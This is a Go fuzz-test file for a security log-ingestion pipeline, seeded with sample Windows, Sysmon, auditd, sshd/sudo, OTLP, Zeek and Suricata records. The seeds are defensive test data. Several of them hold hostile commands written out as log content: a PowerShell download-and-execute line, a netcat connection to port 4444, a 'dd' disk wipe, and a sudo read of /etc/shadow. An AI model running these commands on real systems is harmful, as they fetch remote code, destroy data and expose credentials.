package ingest

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/netip"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

// checkDocTime checks that a written document's time is in ingest's
// window, which keeps senders from choosing daily indices.
func checkDocTime(t *testing.T, doc map[string]any) {
	t.Helper()
	ts, _ := doc["@timestamp"].(string)
	at, err := time.Parse(time.RFC3339Nano, ts)
	if err != nil {
		t.Fatalf("@timestamp %q: %v", ts, err)
	}
	if at.Before(now.Add(-DefaultMaxEventAge)) || at.After(now.Add(MaxEventAhead)) {
		t.Fatalf("@timestamp %v is outside the window", at)
	}
	if _, err := json.Marshal(doc); err != nil {
		t.Fatalf("document does not encode: %v", err)
	}
}

// checkCapped checks that a field holds valid UTF-8 of at most n bytes.
func checkCapped(t *testing.T, f map[string]any, name string, n int) {
	t.Helper()
	v, ok := f[name]
	if !ok {
		return
	}
	s, ok := v.(string)
	if !ok {
		t.Fatalf("%s is %T, not a string", name, v)
	}
	if !utf8.ValidString(s) || len(s) > n {
		t.Fatalf("%s: %d bytes, valid UTF-8 %v", name, len(s), utf8.ValidString(s))
	}
}

var bodySeeds = []string{
	`[{"a":1},{"a":2}]`,
	" \n[ {\"a\":1} ,\n {\"a\":2} ]\n",
	"{\"a\":1}\n{\"a\":2}\n",
	"{\"a\":1}\r\n\r\n{\"a\":2}",
	"{\n  \"a\": 1,\n  \"b\": {\"c\": 2}\n}\n",
	"", "  \n", "[]", "[1,2", "[{}]x", `[{"a":[[[[1]]]]}]`,
	`{"date": 1791720000.5, "level": "warn", "detail": {"a": 1}}`,
	`[{"date":0},{"date":86400.5},{"date":"9999-12-31T00:00:00Z"},{"date":1e18},{"@timestamp":"2026-10-11 11:00:00"}]`,
	`{"Channel":"Security","Computer":"DC1","EventID":4625,"TimeCreated":"2199-01-01 00:00:00 +0000"}`,
	`{"log":"Oct 11 09:15:02 web1 sshd[811]: Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2"}`,
	`{"_HOSTNAME":"db1","SYSLOG_IDENTIFIER":"sshd","_PID":"77","MESSAGE":"Failed password for root from 198.51.100.2 port 2222 ssh2","__REALTIME_TIMESTAMP":"1791763200000000"}`,
	`{"log":"type=EXECVE msg=audit(1760443200.123:4711): argc=3 a0=\"chmod\" a1=\"u+s\" a2=2F746D702F6D7920736800","hostname":"db-01"}`,
	`{"rule":{"level":10,"id":"5763"},"agent":{"id":"001","name":"web-01"},"data":{"srcip":"192.0.2.4"}}`,
	`{"signalith_origin":"x","datamodel":"Risk","a.b":1,"":2}`,
}

func FuzzIngestBody(f *testing.F) {
	for _, s := range bodySeeds {
		for _, tag := range []string{"app", "linux.auth", "linux.journal", "linux.audit", "win.security", "wazuh"} {
			f.Add(tag, []byte(s))
		}
	}
	f.Fuzz(func(t *testing.T, tag string, body []byte) {
		n, checkErr := checkBody(body)
		b := &countingBulk{keep: true}
		p := &Pipeline{Store: b, Prefix: "sig", Now: func() time.Time { return now }}
		res, err := p.IngestBody(context.Background(), tag, body)
		if checkErr != nil {
			// A refused request writes nothing.
			var bad *BodyError
			if !errors.As(err, &bad) || len(b.calls) != 0 || p.Stats().Received != 0 {
				t.Fatalf("checkBody: %v; IngestBody: %v, %d writes", checkErr, err, len(b.calls))
			}
			return
		}
		if err != nil {
			t.Fatalf("checkBody passed, IngestBody: %v", err)
		}
		// Each record is a document, and so is each Linux program start
		// joined from audit records.
		starts := 0
		for _, d := range b.docs {
			if strings.HasSuffix(d.ID, processStartSuffix) && d.Doc["datamodel"] == ProcessStartModel {
				starts++
			}
		}
		if n > MaxRecords || res.Received != n || res.Indexed != len(b.docs) || len(b.docs)-starts != n {
			t.Fatalf("%d records: %+v, %d documents", n, res, len(b.docs))
		}
		ids := map[string]bool{}
		for _, d := range b.docs {
			if d.ID == "" || ids[d.ID] {
				t.Fatalf("document ID %q missing or repeated", d.ID)
			}
			ids[d.ID] = true
			checkDocTime(t, d.Doc)
		}
	})
}

// windowsSeeds are Windows and Sysmon records as Fluent Bit sends them.
var windowsSeeds = []map[string]any{
	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": "4724", "StringInserts": []string{"Administrator", "CORP",
		"S-1-5-21-1-500", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b"}, "Message": "An attempt was made to reset an account's password."},
	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4723, "StringInserts": []string{"bob"}},
	{"Channel": "Security", "Computer": "WS1.corp.local", "EventID": "4731", "StringInserts": []string{"Backup Operators", "WS1",
		"S-1-5-21-2-1009", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b", "-", "Backup Operators", "-"}},
	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4790, "StringInserts": []string{"LdapGroup"}},
	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625, "TimeCreated": "2026-10-11 10:00:00 +0000",
		"StringInserts": []string{"", "", "", "", "S-1-0-0", "administrator", "CORP", "0xC000006D", "", "0xC000006A", "3",
			"NtLmSsp ", "NTLM", "KALI", "", "", "", "", `C:\Windows\System32\svchost.exe`, "203.0.113.9", "51234"},
		"Message": "An account failed to log on."},
	{"Channel": "Security", "Computer": "WS1", "EventID": "4688", "StringInserts": []string{"", "bob", "", "", "0x1a2c",
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "", "", "powershell -enc AAA", "", "", "", "", `C:\Windows\explorer.exe`}},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1,
		"Message": "Process Create:\r\nImage: C:\\Users\\bob\\evil.exe\r\nCommandLine: evil.exe\r\nUser: CORP\\bob\r\nHashes: SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,IMPHASH=DD"},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1,
		"Message": "Process Create:\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nOriginalFileName: Cmd.Exe\r\n" +
			"CommandLine: cmd /c echo one\r\necho two\r\n\r\necho three\r\nCurrentDirectory: C:\\Temp\\\r\n" +
			"User: CORP\\bob\r\nLogonId: 0x3E7\r\nIntegrityLevel: High\r\nParentProcessId: 77\r\nParentUser: CORP\\svc"},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3, "ProviderName": "Microsoft-Windows-Sysmon",
		"Message": "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIsIpv6: False\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444\r\nDestinationPortName: -"},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 27,
		"Message": "File Block Executable:\r\nImage: C:\\Windows\\System32\\curl.exe\r\nTargetFilename: C:\\Users\\bob\\x.exe\r\nUser: CORP\\bob"},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 13,
		"Message": "Registry value set:\r\nEventType: SetValue\r\nImage: C:\\x.exe\r\nTargetObject: HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\r\nDetails: C:\\Users\\bob\\u.exe"},
	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 22,
		"Message": "Dns query:\r\nImage: C:\\x.exe\r\nQueryName: bad.example\r\nQueryStatus: 9003\r\nQueryResults: -"},
	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}},
	WinEventRecord(SystemChannel, "7045", "WS1", now, map[string]string{"ServiceName": "evil", "ImagePath": `C:\evil.exe`}),
	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4103",
		"StringInserts": []string{"        Host Application = powershell.exe -nop\r\n        User = CORP\\bob\r\n", "", "CommandInvocation(Get-Process): \"Get-Process\""}},
	{"Channel": "Windows PowerShell", "Computer": "WS1", "EventID": "400",
		"StringInserts": []string{"Available", "None", "\tNewEngineState=Available\r\n\tHostApplication=powershell -enc AAA\r\n\tEngineVersion=2.0"}},
}

func FuzzNormalizeWindows(f *testing.F) {
	for _, r := range windowsSeeds {
		b, err := json.Marshal(r)
		if err != nil {
			f.Fatal(err)
		}
		f.Add(b)
	}
	f.Add([]byte(`{"Channel":"Security","EventID":4625,"StringInserts":[1,null,{"a":1},[2]],"Computer":7}`))
	f.Fuzz(func(t *testing.T, b []byte) {
		dec := json.NewDecoder(bytes.NewReader(b))
		dec.UseNumber()
		var r map[string]any
		if dec.Decode(&r) != nil || r == nil {
			return
		}
		for _, tag := range []string{"win.security", "win.sysmon", "win.events"} {
			ev := Normalize(tag, r, now)
			if ev.Model == "" || ev.Fields == nil || ev.Fields["message"] == nil {
				t.Fatalf("%s: model %q fields %v", tag, ev.Model, ev.Fields)
			}
			if !IsWazuhAlert(r) {
				// The host name is cut to the DNS limit.
				if h, ok := ev.Fields["host"].(string); ok && len(h) > maxHostLen {
					t.Fatalf("%s: host is %d bytes", tag, len(h))
				}
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatalf("%s: %v", tag, err)
			}
		}
	})
}

func FuzzLinuxSysmonXML(f *testing.F) {
	f.Add(linuxSysmonProcess)
	f.Add(LinuxSysmonRecord("11", "db01", now, map[string]string{"Image": "/usr/bin/cp", "TargetFilename": "/etc/cron.d/<x>&y", "User": "root"})["MESSAGE"].(string))
	f.Add(LinuxSysmonRecord("3", "web01", now, map[string]string{"Image": "/usr/bin/nc", "Protocol": "tcp", "SourceIp": "10.0.0.5",
		"SourcePort": "50000", "DestinationIp": "198.51.100.7", "DestinationPort": "4444", "User": "root"})["MESSAGE"].(string))
	f.Add(`<Event><System><EventID>1</EventID><Computer>` + strings.Repeat("h", 300) + `</Computer></System></Event>`)
	f.Add("<Event><System>")
	f.Add("<Event><EventData><Data Name=\"Image\">-</Data></EventData></Event>")
	f.Fuzz(func(t *testing.T, msg string) {
		ev := ParseProgram("web01", "sysmon", "25330", msg, "syslog")
		fs := ev.Fields
		if fs["vendor_product"] != "Sysmon for Linux" {
			return
		}
		if !strings.HasPrefix(strings.TrimSpace(msg), "<Event") {
			t.Fatalf("read as Sysmon: %q", msg)
		}
		if fs["sourcetype"] != SysmonLinuxSourcetype || fs["signature_id"] == "" || fs["app"] != nil {
			t.Fatalf("fields %v", fs)
		}
		checkCapped(t, fs, "host", maxHostLen)
		checkCapped(t, fs, "dest", maxHostLen)
		// The event's text came through the XML decoder, which refuses
		// invalid UTF-8.
		for k, v := range fs {
			if s, ok := v.(string); ok && !utf8.ValidString(s) {
				t.Fatalf("%s: invalid UTF-8 %q", k, s)
			}
		}
		// The journal's record of it reads the same.
		rec := map[string]any{"SYSLOG_IDENTIFIER": "sysmon", "_HOSTNAME": "web01", "_PID": "25330", "MESSAGE": msg}
		if j := Normalize("linux.journal", rec, now); j.Model != ev.Model || j.Fields["signature_id"] != fs["signature_id"] {
			t.Fatalf("journal: model %s, syslog: %s", j.Model, ev.Model)
		}
	})
}

var auditdSeeds = []string{
	`type=EXECVE msg=audit(1760443200.123:4711): argc=3 a0="chmod" a1="u+s" a2=2F746D702F6D7920736800`,
	"type=SYSCALL msg=audit(1760443200.123:4711): arch=c000003e syscall=59 success=yes exit=0 a0=55d5 ppid=900 pid=901 auid=1000 uid=0 euid=0 comm=\"chmod\" exe=\"/usr/bin/chmod\" key=\"exec\"\x1dARCH=x86_64 SYSCALL=execve AUID=\"bob\" UID=\"root\" EUID=\"root\"",
	`type=PROCTITLE msg=audit(1760443200.123:4711): proctitle=7375646F0063686F776E00726F6F74`,
	`type=SERVICE_STOP msg=audit(1760443200.500:4712): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'`,
	`type=ADD_USER msg=audit(1760443200.600:4713): pid=2 uid=0 auid=1000 ses=3 msg='op=adding user id=1001 exe="/usr/sbin/useradd" acct="eve" res=success'`,
	`type=EXECVE msg=audit(1760443200.700:4714): argc=2 a0="bash" a1_len=6 a1[0]="-c " a1[1]="id"`,
	`type=SYSCALL msg=audit(04/16/2025 08:20:23.552:47372) : arch=x86_64 syscall=execve success=yes exit=0 ppid=5153 pid=6324 auid=ubuntu uid=ubuntu comm=whoami exe=/usr/bin/whoami key=recon`,
	`type=PATH msg=audit(04/16/2025 08:20:23.552:47372) : item=0 name=cafe nametype=CREATE`,
	`type=PROCTITLE msg=audit(02/20/2025 10:00:25.563:44654) : proctitle=dd if=/dev/zero of=/dev/sda bs=1M`,
	`node=db2 type=EXECVE msg=audit(1760443200.123:9): argc=1 a0="id"`,
	`type=EXECVE msg=audit(99999999999999999999.9:1): argc=99 a0=FF a1=C3 name=FFFE`,
	"type=X msg=audit(1.1:1): a b c\td=e 'f=g",
}

var auditdType = regexp.MustCompile(`^[A-Z0-9_]+$`)

func FuzzReadAuditd(f *testing.F) {
	for _, s := range auditdSeeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, line string) {
		rec, ok := ReadAuditd(line)
		if ok != IsAuditdLine(line) {
			t.Fatalf("ReadAuditd %v, IsAuditdLine %v", ok, !ok)
		}
		if ok {
			if !auditdType.MatchString(rec.Type) {
				t.Fatalf("type %q", rec.Type)
			}
			for k := range rec.Fields {
				if k == "" || strings.ContainsAny(k, " \t") {
					t.Fatalf("field name %q", k)
				}
			}
		}
		ev := Normalize("linux.audit", AuditdRecordFor(line, "db-01"), now)
		fs := ev.Fields
		if ev.Model != "Other" || fs["sourcetype"] != AuditdSourcetype || fs["message"] != line {
			t.Fatalf("model %s fields %v", ev.Model, fs)
		}
		checkCapped(t, fs, "host", maxHostLen)
		checkCapped(t, fs, "dest", maxHostLen)
		if !ok {
			return
		}
		if fs["vendor_product"] != AuditdProduct || fs["auditd_type"] != rec.Type || fs["auditd_id"] != rec.Serial {
			t.Fatalf("fields %v", fs)
		}
		// A record's values are capped; its serial number is the header's.
		for k := range fs {
			if strings.HasPrefix(k, "auditd_") && k != "auditd_id" {
				checkCapped(t, fs, k, MaxValueLen)
			}
		}
		for _, k := range []string{"process", "process_path", "process_name", "user"} {
			checkCapped(t, fs, k, MaxValueLen)
		}
		// An EXECVE record is also a program start, joined with the
		// record itself taken as each other record of the start.
		tr := &ProcessTracker{}
		starts := tr.Starts([]Event{ev, ev, ev})
		if want := map[bool]int{true: 3, false: 0}[rec.Type == "EXECVE"]; len(starts) != want {
			t.Fatalf("%d starts of %s", len(starts), rec.Type)
		}
		for _, st := range starts {
			if st.Model != "Endpoint" || st.Fields["host"] != fs["host"] || st.Fields["auditd_id"] != rec.Serial {
				t.Fatalf("start %s %v", st.Model, st.Fields)
			}
			for _, k := range []string{"process", "process_path", "process_name", "process_current_directory", "parent_process", "parent_process_path"} {
				checkCapped(t, st.Fields, k, MaxValueLen)
			}
		}
	})
}

var programSeeds = [][2]string{
	{"sshd", "Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2"},
	{"sshd", "Accepted publickey for deploy from 192.0.2.10 port 40200 ssh2: RSA SHA256:abc"},
	{"sshd-session", "Accepted password for root from 192.0.2.11 port 50000 ssh2"},
	{"sshd", "Failed publickey for invalid user x from 198.51.100.7 port 22 ssh2: RSA SHA256:fake from 203.0.113.50 port 40000 ssh2: ED25519 SHA256:real"},
	{"sshd", "Invalid user admin from 198.51.100.7 from 203.0.113.50"},
	{"sshd", "Invalid user admin from host.example port 22"},
	{"sudo", "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"},
	{"sudo", "   alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash"},
	{"sudo", "pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 euid=0 tty=/dev/pts/0 ruser=alice rhost=  user=alice"},
	{"su", "pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)"},
	{"su", "pam_unix(su-l:auth): authentication failure; logname=bob uid=1000 euid=0 tty=pts/0 ruser=bob rhost=  user=root"},
	{"useradd", "new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash"},
	{"userdel", "delete user 'backdoor'"},
	{"usermod", "add 'eve' to group 'sudo'"},
	{"gpasswd", "add 'eve' to shadow group 'wheel'"},
	{"cron", "(root) CMD (run-parts /etc/cron.hourly)"},
	{"audisp-syslog", `node=db2 type=EXECVE msg=audit(1760443200.123:9): argc=1 a0="id"`},
}

func FuzzParseProgram(f *testing.F) {
	for _, s := range programSeeds {
		f.Add(s[0], s[1])
	}
	f.Fuzz(func(t *testing.T, program, msg string) {
		ev := ParseProgram("web1", program, "811", msg, "linux:auth")
		if ev.Model == "" || ev.Fields == nil || ev.Fields["sourcetype"] == nil {
			t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
		}
		fs := ev.Fields
		if ev.Model == "Authentication" {
			if a := fs["action"]; a != "success" && a != "failure" {
				t.Fatalf("action %v", a)
			}
		}
		// sshd prints an address, never a name, and a source that cannot
		// be told is left out.
		if src, ok := fs["src"].(string); ok && strings.HasPrefix(program, "sshd") {
			if _, err := netip.ParseAddr(src); err != nil || fs["src_ambiguous"] != nil {
				t.Fatalf("src %q, src_ambiguous %v", src, fs["src_ambiguous"])
			}
		}
		// The whole syslog line is kept as the message.
		line := "Oct 11 09:15:02 web1 " + program + "[811]: " + msg
		if got := Normalize("linux.auth", map[string]any{"log": line}, now).Fields["message"]; got != line {
			t.Fatalf("message %q, want %q", got, line)
		}
	})
}

// otlpSeeds are OTLP requests from the OTLP tests.
var otlpSeeds = func() []tRes {
	deep := any("x")
	for range MaxDepth - 1 {
		deep = []any{deep}
	}
	return []tRes{
		{attrs: host, scope: "app.logger", recs: []tRec{{
			time: uint64(now.Add(-time.Minute).UnixNano()), sev: 17, body: "payment failed",
			attrs: []tKV{{"user.name", "ann"}, {"client.address", "203.0.113.9"}, {"http.route", "/pay"},
				{"retries", 3}, {"tags", []any{"a", "b"}}, {"ratio", 0.5}, {"ok", false}},
			trace: []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
			span:  []byte{0, 0, 0, 0, 0, 0, 0, 0},
		}}},
		{attrs: host, recs: []tRec{{
			observed: uint64(now.Add(-2 * time.Second).UnixNano()), sevText: "Warning",
			body: []tKV{{"msg", "disk almost full"}, {"disk", []tKV{{"free_pct", 3}}}, {"bin", []byte("hi")}},
		}}},
		{attrs: host, recs: []tRec{{
			observed: uint64(now.UnixNano()),
			body:     "Oct 11 09:15:02 web1 sshd[811]: Failed password for bob from 192.0.2.4 port 50022 ssh2",
			attrs:    []tKV{{"log.file.name", "auth.log"}},
		}}},
		{recs: []tRec{{
			time: uint64(now.Add(-time.Hour).UnixNano()), sev: 9, sevText: "info",
			body: "<38>Oct 11 11:00:00 bastion sshd[42]: Accepted publickey for alice from 198.51.100.4 port 2222 ssh2",
			attrs: []tKV{{"appname", "sshd"}, {"hostname", "bastion"}, {"proc_id", "42"}, {"facility", 4},
				{"message", "Accepted publickey for alice from 198.51.100.4 port 2222 ssh2"}},
		}}},
		{recs: []tRec{{
			body: []tKV{{"MESSAGE", "Invalid user admin from 203.0.113.50 port 4242"}, {"SYSLOG_IDENTIFIER", "sshd"},
				{"_HOSTNAME", "db1"}, {"_PID", "99"}, {"__REALTIME_TIMESTAMP", strconv.FormatInt(now.Add(-time.Minute).UnixMicro(), 10)}},
		}}},
		{attrs: []tKV{{"host.name", "ignored"}}, recs: []tRec{{
			body: windowsBody("Security", 4625, []tKV{{"TargetUserName", "administrator"}, {"IpAddress", "203.0.113.9"}, {"LogonType", "3"}}, true, "An account failed to log on."),
		}}},
		{recs: []tRec{{body: windowsBody("Microsoft-Windows-Sysmon/Operational", 3, []tKV{{"Image", `C:\Tools\nc.exe`}, {"Protocol", "tcp"},
			{"SourceIp", "10.0.0.5"}, {"DestinationIp", "198.51.100.7"}, {"DestinationPort", "4444"}}, false, "")}}},
		{attrs: []tKV{{"host.name", "a"}}, recs: []tRec{{body: "one"}, {body: "two"}}},
		{recs: []tRec{{time: 1<<64 - 1, body: deep, eventName: "e", sev: -1}}},
	}
}()

// valueLevels is how many levels of AnyValue a decoded value has.
func valueLevels(v any) int {
	n := 0
	switch x := v.(type) {
	case []any:
		for _, e := range x {
			n = max(n, valueLevels(e))
		}
	case map[string]any:
		for _, e := range x {
			n = max(n, valueLevels(e))
		}
	}
	return n + 1
}

var lowerHex = regexp.MustCompile(`^([0-9a-f]{2})*$`)

// checkOTLPLog checks a decoded log record: valid UTF-8 text, nesting
// within MaxDepth, and IDs as lower-case hex.
func checkOTLPLog(t *testing.T, l *otlpLog) {
	t.Helper()
	var text func(v any)
	text = func(v any) {
		switch x := v.(type) {
		case string:
			if !utf8.ValidString(x) {
				t.Fatalf("invalid UTF-8 %q", x)
			}
		case []any:
			for _, e := range x {
				text(e)
			}
		case map[string]any:
			for k, e := range x {
				text(k)
				text(e)
			}
		}
	}
	text(l.resource)
	text(l.attrs)
	text(l.body)
	text(l.scope)
	text(l.sevText)
	text(l.eventName)
	if valueLevels(l.body) > MaxDepth {
		t.Fatalf("body nests %d levels", valueLevels(l.body))
	}
	for _, m := range []map[string]any{l.resource, l.attrs} {
		for k, v := range m {
			if valueLevels(v) > MaxDepth {
				t.Fatalf("%s nests %d levels", k, valueLevels(v))
			}
		}
	}
	if !lowerHex.MatchString(l.traceID) || !lowerHex.MatchString(l.spanID) {
		t.Fatalf("trace %q span %q", l.traceID, l.spanID)
	}
}

// fuzzOTLP checks one OTLP request in either encoding: the check and the
// build pass agree, and IngestOTLP writes every record or none.
func fuzzOTLP(t *testing.T, body []byte, isJSON bool) {
	walk := walkOTLPProto
	if isJSON {
		walk = walkOTLPJSON
	}
	checked, checkBad := 0, 0
	checkErr := walk(body, false, func(l *otlpLog, _ int, bad *BodyError) error {
		if l != nil {
			t.Fatal("the check pass built a record")
		}
		checked++
		if bad != nil {
			checkBad++
		}
		return nil
	})
	built, buildBad := 0, 0
	buildErr := walk(body, true, func(l *otlpLog, size int, bad *BodyError) error {
		built++
		if bad != nil {
			if l != nil {
				t.Fatal("a rejected record came with its contents")
			}
			buildBad++
			return nil
		}
		if size > MaxRecordBytes {
			t.Fatalf("record of %d bytes", size)
		}
		checkOTLPLog(t, l)
		return nil
	})
	if (checkErr == nil) != (buildErr == nil) || checked != built || checkBad != buildBad {
		t.Fatalf("check: %d records (%d bad), %v; build: %d records (%d bad), %v", checked, checkBad, checkErr, built, buildBad, buildErr)
	}
	b := &countingBulk{keep: true}
	p := &Pipeline{Store: b, Prefix: "sig", Now: func() time.Time { return now }}
	res, err := p.IngestOTLP(context.Background(), body, isJSON)
	if checkErr != nil {
		var bad *BodyError
		if !errors.As(err, &bad) || !errors.As(checkErr, &bad) || len(b.calls) != 0 {
			t.Fatalf("check: %v; IngestOTLP: %v, %d writes", checkErr, err, len(b.calls))
		}
		return
	}
	if err != nil || res.Received < checked || res.Rejected != checkBad || res.Indexed != res.Received-checkBad || len(b.docs) != res.Indexed {
		t.Fatalf("%d records: %+v, %v, %d documents", checked, res, err, len(b.docs))
	}
	for _, d := range b.docs {
		checkDocTime(t, d.Doc)
	}
}

func FuzzOTLPJSON(f *testing.F) {
	for _, r := range otlpSeeds {
		f.Add(encodeJSON(r))
	}
	f.Add(encodeJSON(otlpSeeds...))
	for _, s := range []string{
		"", "{}", "[1,2", `{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"body":{"intValue":"x"}}]}]}]}`,
		`{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"body":{"stringValue":"ok"}},{"attributes":7}]}]}]}`,
		`{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"timeUnixNano":"-5","severityNumber":1e3,"traceId":"ZZ","body":{"doubleValue":"NaN"}}]}]}]}`,
	} {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, body []byte) {
		fuzzOTLP(t, body, true)
	})
}

func FuzzOTLPProto(f *testing.F) {
	for _, r := range otlpSeeds {
		f.Add(encodeProto(r))
	}
	f.Add(encodeProto(otlpSeeds...))
	f.Add(encodeProto(otlpSeeds[0])[:12])
	f.Add([]byte{0x0b})
	f.Add([]byte{})
	f.Fuzz(func(t *testing.T, body []byte) {
		fuzzOTLP(t, body, false)
	})
}

// checkSensorEvent checks an event a network sensor line became: it
// encodes, its time is in the window once written, and unless the line
// was not a sensor line at all (sourcetype *:unknown, which goes through
// the field budget as any JSON does) every field name is one Signalith
// knows or a valid name, and there are at most maxFieldsPerEvent.
func checkSensorEvent(t *testing.T, ev Event) {
	t.Helper()
	if ev.Model == "" || ev.Fields == nil || ev.Fields["message"] == nil {
		t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
	}
	doc := ev.Document()
	if _, err := json.Marshal(doc); err != nil {
		t.Fatal(err)
	}
	if st, _ := ev.Fields["sourcetype"].(string); strings.HasSuffix(st, ":unknown") {
		return
	}
	if len(ev.Fields) > maxFieldsPerEvent {
		t.Fatalf("%d fields", len(ev.Fields))
	}
	for k := range ev.Fields {
		if !KnownField(k) && !validFieldName(k) || strings.Contains(k, ".") {
			t.Fatalf("field name %q", k)
		}
	}
	if ev.ID != "" && (len(ev.ID) != 32 || strings.Trim(ev.ID, "0123456789abcdef") != "") {
		t.Fatalf("ID %q", ev.ID)
	}
}

func FuzzZeekRecord(f *testing.F) {
	for _, log := range []string{"conn", "dns", "http", "ssl", "x509", "files", "notice", "capture_loss", "stats", "smb_mapping"} {
		b, err := os.ReadFile(filepath.Join("testdata", "zeek", log+".json"))
		if err != nil {
			f.Fatal(err)
		}
		for _, l := range strings.Split(string(b), "\n") {
			if l != "" {
				f.Add(log, l)
			}
		}
	}
	f.Add("weird", `{"ts":"x","uid":7,"id.orig_h":{"a":1},"answers":[[[1]]],"TTLs":"x","duration":"NaN","percent_lost":1e309}`)
	f.Add("conn", `{"ts":1e30,"id.orig_h":"::ffff:1.2.3.4","conn_state":"OTH","resp_bytes":-1,"service":","}`)
	f.Fuzz(func(t *testing.T, log, line string) {
		ev := Normalize("zeek.opt.zeek.logs.current."+log+".log", map[string]any{"log": line, "hostname": "nsm-01"}, now)
		checkSensorEvent(t, ev)
		if r, ok := decodeSensorLine(line); ok {
			checkSensorEvent(t, Normalize("zeek", r, now))
			checkSensorEvent(t, ParseZeek(log, r, ""))
		}
	})
}

func FuzzSuricataEVE(f *testing.F) {
	b, err := os.ReadFile(filepath.Join("testdata", "suricata", "eve.json"))
	if err != nil {
		f.Fatal(err)
	}
	for _, l := range strings.Split(string(b), "\n") {
		if l != "" {
			f.Add(l)
		}
	}
	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"dns","src_ip":"192.0.2.1","src_port":53,"dns":{"answers":[1,{"rdata":{}}],"grouped":{"A":[[]]},"queries":"x"}}`)
	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"alert","src_ip":1,"alert":{"severity":"x","metadata":[]},"http":"x","flow_id":-1}`)
	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"weird.type-$","src_ip":"192.0.2.1","weird.type-$":{"a":[1,2]}}`)
	f.Fuzz(func(t *testing.T, line string) {
		checkSensorEvent(t, Normalize("suricata.eve", map[string]any{"log": line, "hostname": "nsm-01"}, now))
		if r, ok := decodeSensorLine(line); ok && IsSuricataEVE(r) {
			checkSensorEvent(t, Normalize("", r, now))
		}
	})
}

func FuzzSensorStatus(f *testing.F) {
	b, err := os.ReadFile(filepath.Join("testdata", "sensor", "status.json"))
	if err != nil {
		f.Fatal(err)
	}
	f.Add(strings.TrimSpace(string(b)))
	f.Add(`{"kind":"signalith-sensor-status","v":1,"zeek":"x","suricata":{"running":"yes"},"rules":{"count":1e300},"interface":{"drop_percent":"NaN"},"warnings":"drops"}`)
	f.Fuzz(func(t *testing.T, line string) {
		ev := Normalize(SensorStatusTag, map[string]any{"log": line, "hostname": "nsm-01"}, now)
		checkSensorEvent(t, ev)
		if s := ev.Sensor; s != nil {
			if s.DropPercent < 0 || s.DropPercent > 100 || len(s.Warnings) > maxSensorWarnings || len(s.Interface) > maxSensorWord {
				t.Fatalf("sensor %+v", s)
			}
			if _, err := json.Marshal(s); err != nil {
				t.Fatal(err)
			}
		}
	})
}

func FuzzSuricataText(f *testing.F) {
	b, err := os.ReadFile(filepath.Join("testdata", "suricata", "eve.json"))
	if err != nil {
		f.Fatal(err)
	}
	for _, l := range strings.Split(string(b), "\n") {
		if l != "" {
			f.Add("suricata[1234]: " + l)
		}
	}
	f.Add(`{"event_type":"alert"}`)
	f.Add(strings.Repeat(" ", 300) + `{"event_type":"alert","timestamp":"x","src_ip":"1"}`)
	f.Fuzz(func(t *testing.T, text string) {
		if ev, ok := ParseSuricataText(text); ok {
			checkSensorEvent(t, ev)
			if ev.ID == "" {
				t.Fatal("no ID")
			}
		}
	})
}

func FuzzAzureRecords(f *testing.F) {
	f.Add(`{"records": [` + azureSignInRecord + `, ` + azureActivityRecord + `]}`)
